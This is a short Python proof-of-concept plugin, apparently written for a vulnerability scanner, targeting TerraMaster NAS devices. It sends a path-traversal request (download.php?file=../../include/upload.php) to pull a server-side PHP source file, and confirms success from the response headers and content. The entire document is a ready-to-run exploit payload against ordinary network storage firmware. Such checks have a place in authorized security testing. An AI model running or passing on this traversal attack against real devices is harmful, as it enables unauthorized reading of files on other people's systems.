#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  TerraMaster NAS网络存储服务器 任意文件下载
Author    :  a
mail      :  a@lcx.cc
 
 
"""
import urlparse

def assign(service, arg):
    if service == 'terramaster':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    url = arg + 'cgi-bin/filemanage/download.php?file=../../include/upload.php'
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 200 and 'filename="upload.php"' in head and 'Content-Transfer-Encoding: binary' in head and 'spartacus' in res:
        security_hole(url)
        
    
   


        return arg
if __name__== '__main__':
    from dummy import *
